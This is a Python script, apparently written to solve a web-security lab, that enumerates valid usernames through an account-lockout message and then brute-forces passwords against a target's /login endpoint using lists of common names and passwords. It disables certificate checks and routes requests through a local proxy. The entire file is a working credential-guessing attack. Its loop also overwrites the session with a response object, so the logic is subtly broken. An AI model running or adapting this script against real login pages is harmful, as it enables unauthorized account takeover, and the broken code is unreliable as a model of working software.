import requests
import sys
import urllib3
from colorama import *

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'https':'http://127.0.0.1:8080','http':'http://127.0.0.1:8080'}
usernames = ['carlos', 'root', 'admin', 'test', 'guest', 'adm', 'mysql', 'user', 'administrator', 'oracle', 'ftp', 'pi', 'puppet', 'ansible', 'ec2-user', 'vagrant', 'azureuser', 'academico', 'acceso', 'access', 'accounting', 'accounts', 'acid', 'activestat', 'ad', 'adam', 'adkit', 'admin', 'administracion', 'administrador', 'administrator', 'administrators', 'admins', 'ads', 'adserver', 'adsl', 'ae', 'af', 'affiliate', 'affiliates', 'afiliados', 'ag', 'agenda', 'agent', 'ai', 'aix', 'ajax', 'ak', 'akamai', 'al', 'alabama', 'alaska', 'albuquerque', 'alerts', 'alpha', 'alterwind', 'am', 'amarillo', 'americas', 'an', 'anaheim', 'analyzer', 'announce', 'announcements', 'antivirus', 'ao', 'ap', 'apache', 'apollo', 'app', 'app01', 'app1', 'apple', 'application', 'applications', 'apps', 'appserver', 'aq', 'ar', 'archie', 'arcsight', 'argentina', 'arizona', 'arkansas', 'arlington', 'as', 'as400', 'asia', 'asterix', 'at', 'athena', 'atlanta', 'atlas', 'att', 'au', 'auction', 'austin', 'auth', 'auto', 'autodiscover']
passwords = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana', 'moon', 'moscow']
init(autoreset=True)

def Username_enumeration_via_account_lock(s, url):
    valid_username = None
    print(Fore.YELLOW + '[!] Trying to find the valid username..')
    print(Fore.YELLOW + '[!] This may take sometime to success..')
    for username in usernames:
        for i in range (1,6):
            login_url = url + '/login'
            credentials = {'username':username,'password':'0xans'}
            r = s.post(login_url, data=credentials, verify=False, proxies=proxies)
            res = r.text
            if 'Invalid username or password' not in res:
                print (Fore.CYAN + f'[+] Cheacking this : "{username}"..') 
                valid_username = username
                if valid_username is not None:
                    print(Fore.YELLOW + f'[!] Trying to find the password for the username({valid_username})..')
                    for password in passwords:
                        login_url = url + '/login'
                        s = s.post(login_url, data={'username': valid_username, 'password': password}, verify=False, proxies=proxies)
                        res = s.text
                        if 'You have made too many incorrect login attempts'not in res and 'Invalid username or password' not in res:
                            print(Fore.GREEN + f'[+] Valid credentials: {valid_username}:{password}')
                            s = s.post(login_url, data={'username': valid_username, 'password': password}, verify=False, proxies=proxies)
                            return True
                else:
                    print(Fore.RED + '[-] No valid username found.')
                    return False

def main():
    if len(sys.argv) != 2:
        print(Fore.YELLOW + '[-] Uasge : %s <url>' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    Username_enumeration_via_account_lock(s, url)
if __name__ == '__main__':
    main()